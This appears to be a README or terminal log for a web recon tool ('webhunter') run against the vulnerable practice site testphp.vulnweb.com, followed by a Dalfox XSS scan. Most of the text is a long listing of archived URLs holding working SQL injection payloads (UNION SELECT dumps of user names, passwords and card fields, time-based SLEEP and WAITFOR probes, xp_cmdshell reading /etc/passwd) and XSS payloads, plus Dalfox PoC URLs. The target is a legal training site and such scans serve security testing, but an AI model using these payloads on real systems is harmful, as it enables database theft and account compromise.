# webhunter
python demo.py -t http://testphp.vulnweb.com/                   
[+] Output directory: output/testphp.vulnweb.com_20251030_004430


╔═══════════════════════════════════════════════════════════╗                                                                                                                                                                              
║                                                           ║                                                                                                                                                                              
║     █████╗ ██████╗  ██████╗██╗  ██╗██╗██╗   ██╗███████╗  ║                                                                                                                                                                               
║    ██╔══██╗██╔══██╗██╔════╝██║  ██║██║██║   ██║██╔════╝  ║                                                                                                                                                                               
║    ███████║██████╔╝██║     ███████║██║██║   ██║█████╗    ║                                                                                                                                                                               
║    ██╔══██║██╔══██╗██║     ██╔══██║██║╚██╗ ██╔╝██╔══╝    ║                                                                                                                                                                               
║    ██║  ██║██║  ██║╚██████╗██║  ██║██║ ╚████╔╝ ███████╗  ║                                                                                                                                                                               
║    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝  ║                                                                                                                                                                               
║                                                           ║                                                                                                                                                                              
║         HUNTER v2.0 - Advanced Recon & Bug Hunting        ║                                                                                                                                                                              
║           Wayback | GF Patterns | ParamSpider            ║                                                                                                                                                                               
║                 Responsible Disclosure                    ║                                                                                                                                                                              
║                                                           ║                                                                                                                                                                              
╚═══════════════════════════════════════════════════════════╝                                                                                                                                                                              
                                                                                                                                                                                                                                           
        
[!] Target: http://testphp.vulnweb.com/
[!] Threads: 10
[!] Use only on authorized targets!


============================================================
[PHASE 1] Advanced Subdomain Discovery
============================================================
[*] Running Subfinder...
[*] Subfinder scanning...
[+] Subfinder found 63 subdomains
[*] Checking Certificate Transparency logs...
[+] crt.sh found 0 subdomains
[*] Querying HackerTarget API...
[+] HackerTarget found 1 subdomains

[+] Total unique subdomains: 64

============================================================
[PHASE 2] Advanced Wayback URL Discovery
============================================================
[*] Scanning 20 domains from Wayback Machine...
[+] dalianxinyuwangqipai.testphp.vulnweb.com: 0 URLs
[+] xunyinglanqiubifenzhibo.testphp.vulnweb.com: 0 URLs
[+] www.or-zue74zu.testphp.vulnweb.com: 0 URLs
[+] a196.testphp.vulnweb.com: 0 URLs
[+] lilaizhenrenyulecheng.testphp.vulnweb.com: 0 URLs
[+] qx7.testphp.vulnweb.com: 0 URLs
[+] zhenrenyulekaihu.testphp.vulnweb.com: 0 URLs
[+] internal-addondomain2460html8-wpmulti1wpmulti1.testphp.vulnweb.com: 0 URLs
[+] blogger.com-lab.testphp.vulnweb.com: 0 URLs
[+] bet365dabukailiao.testphp.vulnweb.com: 0 URLs
[+] ens1.testphp.vulnweb.com: 0 URLs
[+] n155.testphp.vulnweb.com: 0 URLs
[+] u201dtestphp.testphp.vulnweb.com: 0 URLs
[+] quaomenxianshangyulecheng.testphp.vulnweb.com: 0 URLs
[+] yulexinxiwangbocai.testphp.vulnweb.com: 0 URLs
[+] liubowenxinshuizhuluntan.testphp.vulnweb.com: 0 URLs
[+] www.testphp.vulnweb.com: 10000 URLs
[+] baomahuiyulechengqipai.testphp.vulnweb.com: 0 URLs
[+] testphp.vulnweb.com: 10000 URLs
[+] testaspnet.testphp.vulnweb.com: 0 URLs

[+] Total unique archived URLs: 9913

============================================================
[PHASE 3] Advanced Parameter Discovery
============================================================
[*] Extracting parameters from URLs...
[+] Extracted 48 parameters from URLs
[*] Adding common parameters from wordlist...
[+] Total parameters: 131
[*] Analyzing JavaScript files for hidden parameters...
[+] Found 0 parameters in JavaScript

============================================================
[PHASE 4] GF Pattern Analysis
============================================================
[*] Checking for XSS (High)...
[!] Found 13 potential XSS endpoints
[*] Checking for SSRF (Critical)...
[!] Found 10 potential SSRF endpoints
[*] Checking for Open Redirect (Medium)...
[!] Found 3 potential Open Redirect endpoints
[*] Checking for SQL Injection (Critical)...
[!] Found 605 potential SQL Injection endpoints
[*] Checking for LFI/RFI (High)...
[!] Found 5 potential LFI/RFI endpoints
[*] Checking for XXE (High)...
[*] Checking for IDOR (Medium)...
[!] Found 478 potential IDOR endpoints
[*] Checking for API Endpoints (Info)...
[!] Found 3 potential API Endpoints endpoints

============================================================
[PHASE 5] Interesting Endpoint Discovery
============================================================
[*] Searching for Admin Panels...
[!] Found 52 Admin Panels
[*] Searching for Config Files...
[!] Found 2 Config Files
[*] Searching for API Endpoints...
[*] Searching for Backup Files...
[!] Found 16 Backup Files
[*] Searching for Debug/Test...
[!] Found 9913 Debug/Test
[*] Searching for Upload Forms...
[!] Found 176 Upload Forms
[*] Searching for Login Forms...
[!] Found 72 Login Forms

============================================================
[PHASE 6] Advanced Scoring & Statistics
============================================================

============================================================
SCAN STATISTICS
============================================================
Security Score: 70062
Subdomains: 64
Archived URLs: 9913
Parameters: 131
Interesting Endpoints: 10231

Vulnerability Breakdown:
  XSS: 13 (High)
  SSRF: 10 (Critical)
  Open Redirect: 3 (Medium)
  SQL Injection: 605 (Critical)
  LFI/RFI: 5 (High)
  IDOR: 478 (Medium)
  API Endpoints: 3 (Info)

============================================================
[PHASE 7] Comprehensive Report Generation
============================================================
[+] JSON report: output/testphp.vulnweb.com_20251030_004430/report.json
[+] HTML report: output/testphp.vulnweb.com_20251030_004430/report.html
[+] Markdown report: output/testphp.vulnweb.com_20251030_004430/report.md
[+] Summary: output/testphp.vulnweb.com_20251030_004430/SUMMARY.txt

============================================================
[✓] SCAN COMPLETED SUCCESSFULLY!
============================================================
[✓] Time elapsed: 57.43 seconds
[✓] Results saved to: output/testphp.vulnweb.com_20251030_004430
[✓] Open report.html for detailed visual report
============================================================

QUICK SUMMARY:
→ Subdomains: 64
→ URLs: 9913
→ Parameters: 131
→ Vulnerabilities: 1117
→ Score: 70062


dalfox url http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
                                                        
               ░█▒               
             ████     ▓                    
           ▓█████  ▓██▓                  
          ████████████         ░          
        ░███████████▓          ▓░     
     ░████████████████        ▒██░    
    ▓██████████▒███████     ░█████▓░    
   ██████████████░ ████        █▓     
 ░█████▓          ░████▒       ░         Dalfox v2.11.0
 █████               ▓██░             
 ████                  ▓██      Powerful open-source XSS scanner       
 ███▓        ▓███████▓▒▓█░     and utility focused on automation.       
 ███▒      █████                     
 ▓███     ██████                    
 ████     ██████▒                
 ░████    ████████▒
 
 🎯  Target                 http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
 🏁  Method                 GET
 🖥   Performance            100 worker / 1 cpu
 ⛏   Mining                 true (Gf-Patterns, DOM Mining Enabled)
 ⏱   Timeout                10
 📤  FollowRedirect         false
 🕰   Started at             2025-10-30 00:50:44

[*] --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[*] Starting scan [SID:Single] / URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
[I] Found 0 testing points in DOM-based parameter mining
[I] Content-Type is text/xml;charset=UTF-8
[I] Reflected id param => $
    1 line:  r: Unknown column '1Dalfox' in 'where cl
[W] Reflected Payload in HTML: id='><a href=javas&#99;ript:alert(1)/class=dalfox>click
    1 line:  syntax to use near ''><a href=javas&#99;ript:alert(1)/class=dalfox>click' at lin
[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick
[V] Triggered XSS Payload (found DOM Object): id="><svg/class="dalfox"onLoad=alert(1)>
    1 line:  syntax to use near '"><svg/class="dalfox"onLoad=alert(1)>' at line 1
[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%281%29%3E
[*] --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[*] [duration: 6.963838466s][issues: 2] Finish Scan!
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/tooltesting/output/testphp.vulnweb.com_20251030_004430]
└─$ ls                                                            
archived_urls.txt     gf_idor.txt     gf_open_redirect.txt  gf_ssrf.txt  interesting_endpoints.json  report.html  report.md       SUMMARY.txt            vulnerabilities.json
gf_api_endpoints.txt  gf_lfi_rfi.txt  gf_sql_injection.txt  gf_xss.txt   parameters.json             report.json  subdomains.txt  unique_parameters.txt
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/tooltesting/output/testphp.vulnweb.com_20251030_004430]
└─$ cat gf_sql_injection.txt 
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%204910%3D4211%23
http://testphp.vulnweb.com/listproducts.php?cat=%27SELECT+%40%40version
http://testphp.vulnweb.com/index.php?%25id%25=1%20AND%207364%3D7364&user=2
http://testphp.vulnweb.com/?%3Fid=1%20AND%208524%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288524%3D8524%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20RLIKE%20%28SELECT%207214%20FROM%20%28SELECT%28SLEEP%285%29%29%29DgJM%29%23
http://testphp.vulnweb.com/redir.php?r=https://numberfields.asu.edu/NumberFields/show_user.php?userid=3775107
http://testphp.vulnweb.com/listproducts.php?cat=%27union+select+%27a%27
http://testphp.vulnweb.com/index.php?%25id%25=9264&user=2
http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z'%22%3E%3Csvg%2Fonload%3Dalert(45)%3Eto
http://testphp.vulnweb.com/listproducts.php?artist=123&amp;asdf=ff&amp;cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178706a71%2C0x615258465768637a5769%2C0x71706b6a71%29%2CNULL--%20-
http://testphp.vulnweb.com/listproducts.php?cat=1/nginx/1.4.1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%2C..%22%28%28%2C%28%27.
http://testphp.vulnweb.com/listproducts.php?cat=-999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users
http://testphp.vulnweb.com:80/AJAX/infocateg.php%E3%80%91%E5%B9%B6%E6%8F%90%E4%BA%A4%E3%80%90id=1%E3%80%91%EF%BC%8C%E6%89%80%E4%BB%A5%E6%9E%84%E5%BB%BA%E4%B8%BA
http://testphp.vulnweb.com/AJAX/infoartist.php?id=4048
http://testphp.vulnweb.com/index.php?id=%252%25&user=1&gqAL=9173%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/?%3Fid=1%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%2877%29%7C%7CCHR%2873%29%7C%7CCHR%28115%29%2C5%29%20FROM%20DUAL--
http://testphp.vulnweb.com/?%3Fid=1%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%2877%29%7C%7CCHR%2873%29%7C%7CCHR%28115%29%2C5%29%20FROM%20DUAL--
http://testphp.vulnweb.com/?%3Fid=6586
http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%22%3E%3Cscript%3Ealert(45)%3C%2Fscript%3E
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,%202,%203,%204,%205,%206,%20Table_name%20as%20TablesName,%208,%209
http://testphp.vulnweb.com/?%3Fid=4821
http://testphp.vulnweb.com/listproducts.php?cat=-900990909%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11;
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%20AND%209129%3D9129%20AND%20%283485%3D3485
http://testphp.vulnweb.com/listproducts.php?cat=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29adhe%29--%20OULg
http://testphp.vulnweb.com:80/listproducts.php?cat=1'
http://testphp.vulnweb.com/?%3Fid=1%29%3BSELECT%20PG_SLEEP%285%29--
http://testphp.vulnweb.com/index.php?%25id%25=1138-1137&user=2
http://testphp.vulnweb.com/?%3Fid=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
http://testphp.vulnweb.com/listproducts.php?cat=1%20ORDER%20BY%201--%20-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20ORDER%20BY%203--%20-
http://testphp.vulnweb.com/listproducts.php?cat=-900990909%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11;
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%20AND%209623%3D2507%20AND%20%286934%3D6934
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%209396%3D3659
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%20EXTRACTVALUE%281877%2CCONCAT%280x5c%2C0x716a717671%2C%28SELECT%20%28ELT%281877%3D1877%2C1%29%29%29%2C0x7178767171%29%29%20AND%20%27qZnv%27%3D%27qZnv
http://testphp.vulnweb.com/listproducts.php?cat=%5B%5B444%2A6664%5D%5D
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20ORDER%20BY%206--%20-
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20RewS&user=2
http://testphp.vulnweb.com/?%3Fid=1%20AND%202688%3D2688
http://testphp.vulnweb.com/listproducts.php?cat=.1+union+all+select+1,group_concat(table_name
http://testphp.vulnweb.com/redir.php?r=http://www.dicodunet.com/out.php?url=https://numberfields.asu.edu/NumberFields/show_user.php?userid=1671843
http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+2
http://testphp.vulnweb.com/index.php?id=3381&user=1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1+AND+UPDATEXML
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20SLEEP%285%29--%20TtVI
http://testphp.vulnweb.com/listproducts.php?cat=-9999%20UNION%20SELECT%201,2,3,4,5,6,pass,8,9,10,11%20FROM%20users
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%20%28SELECT%20CHR%28115%29%7C%7CCHR%2866%29%7C%7CCHR%2884%29%7C%7CCHR%2865%29%29%3D%27Rxnx%27%20AND%20%288556%3D8556&user=2
http://testphp.vulnweb.com/listproducts.php?cat=5-4
http://testphp.vulnweb.com/%CB%93%E2%86%92listproducts.php?cat=FUZZ
http://testphp.vulnweb.com/listproducts.php?cat=1+and+1%3D1
http://testphp.vulnweb.com/comment.php?aid=1A01
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27ByUkKd%3C%27%22%3EJafmaz
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20CONCAT%280x7178706a71%2C0x7a6c5754656d755a4672434b75615468454c6c734a796b554e42444178504a4845674d4f6e426352%2C0x71706b6a71%29%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%208524%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288524%3D8524%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29%20AND%20%27xXrN%27%3D%27xXrN
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10.https://overthewire.org/wargames/11.https://www.root-me.org/?lang=en12.http://www.try2hack.nl/13.http://vicnum.ciphertechs.com/14.http://webappsecmovies.sourceforge.net/webgoat/15
http://testphp.vulnweb.com/?%3Fid=1%20AND%201315%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281315%3D1315%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20mBuF
http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%2C%29%2C.%27%2C%29%22%28%28
http://testphp.vulnweb.com/?%3Fid=1%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%2877%29%7C%7CCHR%2873%29%7C%7CCHR%28115%29%2C5%29%20FROM%20DUAL--
http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=3
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/listproducts.php?cat=1+and+ascii%28substring%28database%28%29%2C1%2C1%29%29%3E80
http://testphp.vulnweb.com/listproducts.php?cat=1/nginx/1.4.1176.28.50.165Skipped
http://testphp.vulnweb.com/?%3Fid=1%20AND%202017%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%28111%29%7C%7CCHR%2865%29%7C%7CCHR%2884%29%2C5%29--%20Rokw
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%29%20AND%205413%3D5413%23
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20CONCAT%280x7178706a71%2C0x6b4e4a454c7652494765%2C0x71706b6a71%29%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com:80/comment.php?pid=6
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%205629%3D1437--%20YNOo
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%2093%3D88%20AND%20%284234%3D4234&user=2
http://testphp.vulnweb.com/?%3Fid=1%20AND%205858%3D7270--%20OIrG
http://testphp.vulnweb.com/listproducts.php?cat=1+and+substring%28%40%40version%2C1%2C1%29
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,table_name,3,4,5,6,7,8,9,10,11+from+information_schema.tables+where+table_schema=database()--+
http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe%20src%3d%22%2f%2fmv9e
http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1
http://testphp.vulnweb.com/listproducts.php?cat=$%7Binjection
http://testphp.vulnweb.com:80/comment.php?pid=3
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%209129%3D9129
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%20%28SELECT%20CHR%2866%29%26CHR%28101%29%26CHR%28108%29%26CHR%2876%29%20FROM%20MSysAccessObjects%29%3D%27WXYh%27%20AND%20%281690%3D1690&user=2
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,database()--
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/
http://testphp.vulnweb.com/listproducts.php?cat=13DatabaseManipulations
http://testphp.vulnweb.com/?%3Fid=1%20ORDER%20BY%201--%20usrP
http://testphp.vulnweb.com/comment.php?aid=1%20OR%201==1%20--
http://testphp.vulnweb.com/listproducts.php?cat=123&
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%204;
http://testphp.vulnweb.com/listproducts.php?cat=-
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%208199%3D5918%20AND%20%27aTOj%27%3D%27aTOj
http://testphp.vulnweb.com/listproducts.php?cat=%27union+select+%27a%27,%27b
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20CONCAT%280x7178706a71%2C0x45477071434e57777072%2C0x71706b6a71%29%2C57--%20-
http://testphp.vulnweb.com/listproducts.php?cat=.1'
http://testphp.vulnweb.com/listproducts.php?cat=-1%E2%80%99%EF%80%A0%EF%80%A0
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20ELT%288485%3D8485%2CSLEEP%285%29%29%23
http://testphp.vulnweb.com:80/comment.php?aid=3
http://testphp.vulnweb.com:80/listproducts.php?cat=1*
http://testphp.vulnweb.com/listproducts.php?cat=1%60
http://testphp.vulnweb.com/index.php?%25id%25=1&user=2
http://testphp.vulnweb.com/?%3Fid=1%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28116%29%7C%7CCHR%2877%29%7C%7CCHR%2873%29%7C%7CCHR%28115%29%2C5%29%20FROM%20DUAL--
http://testphp.vulnweb.com/listproducts.php?cat=-999
http://testphp.vulnweb.com/listproducts.php?id=1%27kOQjuk%3C%27%22%3EFcdVnA
http://testphp.vulnweb.com/listproducts.php?cat=1+and+ascii(substring((select
http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+2--+
http://testphp.vulnweb.com/listproducts.php?cat=1+and+(select+username+from+users+limit+0,1
http://testphp.vulnweb.com/listproducts.php?cat=123
http://testphp.vulnweb.com/listproducts.php?cat=1+and+97
http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20EXTRACTVALUE%281946%2CCONCAT%280x5c%2C0x7176716271%2C%28SELECT%20%28ELT%281946%3D1946%2C1%29%29%29%2C0x716b786b71%29%29
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%2057%2CCONCAT%280x7178706a71%2C0x674967464f526f497a65%2C0x71706b6a71%29--%20-
http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe%25
http://testphp.vulnweb.com/listproducts.php?cat=2%3E%3Cscript%3Ealert(%22Anmol%22)%3C/script%3E
http://testphp.vulnweb.com/listproducts.php?cat=z?cat=z%22%3E%3Ciframe%2Fsrc%3DJavaScriPt%3Aalert(45)%3E
http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+6--+
http://testphp.vulnweb.com/?%3Fid=1%27DxpaRz%3C%27%22%3EMnOrHd
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%208386%3DBENCHMARK%285000000%2CMD5%280x5a674156%29%29%23
http://testphp.vulnweb.com/listproducts.php?cat=%27union+select+%27a%27+from+dual
http://testphp.vulnweb.com/?%3Fid=1%20AND%208412%3D2011--%20qyUa
http://testphp.vulnweb.com/index.php?%25id%25=1%29%28%22%27%2C%28%28%2C%2C%2C&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178706a71%2C0x6d4d6155774e4d625161537278706a71666154425968797847585a5a6273574c78515a696f6f7973%2C0x71706b6a71%29--%20-
http://testphp.vulnweb.com/listproducts.php?cat=-1%E2%80%99
http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(1)%3C/script%3E
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7178706a71%2C0x73594c4f44576f4e4675%2C0x71706b6a71%29--%20-
http://testphp.vulnweb.com/index.php?id=%252%25%27%29%20AND%20%28SELECT%20ASCII_CHAR%28256%29%20FROM%20SYSTEM.ONEROW%29%20IS%20NULL%20AND%20%28%27Zyhn%27%3D%27Zyhn&user=1
http://testphp.vulnweb.com/listproducts.php?cat=1%EF%80%A0%EF%82%B7
http://testphp.vulnweb.com/listproducts.php?cat=1/nginx/1.4.1176.28.50.165Skipped-NR--NR-2http://www.vulnsite.com/products/shop.php?id=13/
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/listproducts.php?cat=123%22&
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%202017%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%28111%29%7C%7CCHR%2865%29%7C%7CCHR%2884%29%2C5%29%20AND%20%27Xcxi%27%3D%27Xcxi
http://testphp.vulnweb.com/listproducts.php?cat=
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+all+select+1,group_concat(%27user:%27,uname,%27----pass:%27,pass,%27-----cc:%27,cc,%27------email:%27,email),3,4,5,6,7,8,9,10,11+from+users--+
http://testphp.vulnweb.com/listproducts.php?cat=1-
http://testphp.vulnweb.com/listproducts.php?cat=1/nginx/1.4.1176.28.50.165Skipped-NR--NR-2
http://testphp.vulnweb.com:80/comment.php?pid=7
http://testphp.vulnweb.com/?%3Fid=1%20AND%208471%3D4506
http://testphp.vulnweb.com/listproducts.php?cat=123%22
http://testphp.vulnweb.com/?%3Fid=1%27%29%20ORDER%20BY%201040--%20BRDz
http://testphp.vulnweb.com/cat=2
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6
http://testphp.vulnweb.com/login.php?id=1&SlFY=4435%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/listproducts.php?cat=1+and+(select+password+from+users+limit+0,1
http://testphp.vulnweb.com/listproducts.php?cat=0.or-1%23
http://testphp.vulnweb.com/index.php?%25id%25=1%28%22..%28.%28%2C%27%28&user=2
http://testphp.vulnweb.com/redir.php?r=http://loredz.com/vb/go.php?url=https://milkyway.cs.rpi.edu/milkyway/show_user.php?userid=3891562
http://testphp.vulnweb.com/login.php?id=1&NtFH=4809%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/?%3Fid=1%27erJqmZ%3C%27%22%3ECMJcRb
http://testphp.vulnweb.com/listproducts.php?cat=1+union+all+select+1,2,3,4,5,6,7,8,9,10,11--
http://testphp.vulnweb.com/listproducts.php?cat=1/
http://testphp.vulnweb.com/listproducts.php?cat=1+PROCEDURE
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%2083%3D93%20AND%20%288779%3D8779&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20BENCHMARK%285000000%2CMD5%280x66726450%29%29--%20WqjC
http://testphp.vulnweb.com/listproducts.php?cat=1/nginx/1.4.1176.28.50.165Skipped-NR--NR-2http://www.vulnsite.com/products/shop
